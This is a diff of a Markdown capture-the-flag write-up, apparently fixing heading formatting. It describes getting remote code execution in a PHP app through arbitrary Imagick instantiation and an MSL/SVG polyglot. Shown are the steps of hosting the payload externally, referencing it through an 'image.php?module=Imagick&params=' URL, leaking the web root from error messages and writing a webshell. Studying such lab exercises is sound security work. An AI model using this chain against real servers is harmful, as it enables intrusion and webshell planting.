@@ -1,9 +1,9 @@
-#PHP & Arbitrary Object Instantiation
+# PHP & Arbitrary Object Instantiation
 The September 2022 CTF released by @leonjza from Orange Cyberdefense was challenging, informative and a lot of fun. The challenge context was PHP and Code Execution via Arbitrary Object Instantiation, but I wont give away the ending quite yet.
 
 I encourage you to first try it out, the URL is https://goldfish-tj6gf.ondigitalocean.app/index.html.
 
-##The Eagle has landed
+## The Eagle has landed
 The landing page greets you with a few UI components, a file upload selector, a dropdown to select a size value between 1 and 4, a "send" button to upload the file and a link at the bottom labelled "Check DB".
 ![Landing page](Landing_page.png)
 
@@ -36,7 +36,7 @@ The rights can be set to be "read" and/or "write" or "none" for each type of cod
 
 Due to this my payload was not being run and it kept throwing an error about the "PS" coder being blocked.
 
-##File inception
+## File inception
 One of the many google results pointed me in the direction of a polgyglot MSL(Magick Scripting Lanaguage) file, this is almost equivalent to a file within a file, something similar to an html file that references an xml file, which happens to be embedded in the original html file. Link to website: https://www.synacktiv.com/en/publications/playing-with-imagetragick-like-its-2016.html
 
 An msl file in ImageMagick is a scripting file that can run within the ImageMagick context. Link to documentation: https://imagemagick.org/script/conjure.php#msl
@@ -74,7 +74,7 @@ Now all we need, is to find a way of referencing our svg file name at least part
  </svg>
 </image>
 ```
-##But uploading the file doesn't work!!
+## But uploading the file doesn't work!!
 If you just upload the payload, no webshell will be created due to the code in the upload php file (you can take a look shortly when you have your webshell :)). The object instantiation is only triggered when you use the "params" parameter in the URI of the image.php page. By using the parameters to construct an instance of Imagick in PHP, we can control which file is used in the constructor via the "params" value and this is processed lower down the code chain as explained in the link(https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/).
 
 You can get more information on the Imagick constructor at the documentation link : https://www.php.net/manual/en/imagick.construct.php.
@@ -83,7 +83,7 @@ Hosting the file and then referencing it from that location will cause the file 
 We need to figure out the path of the web site root folder. I did this by forcing an error, one way is to leave the "params" without a value, this gives us an error message and so after a few attempts we find that the correct path to write the webshell to is /var/www/html. 
 Now all we need to do is change the webshell path and change the "params" to our hosted image path, ie "image.php?module=Imagick&params=**http:// {example.com}/{your svg file}**&size=1".
 
-##LIGHTS,CAMERA...ACTION!!
+## LIGHTS,CAMERA...ACTION!!
 The result of a *successful* upload is a new error page.
 ![RCE success](upload_successful.png)
 
@@ -92,7 +92,6 @@ Your webshell works!
 
 ##Let's get that FLAG!!! 
 Running the ls command, we see a few files in the web directory.
-![Listing](listing.png)
 
 **(Mini challenge can you find the flag! go for it!).**
 
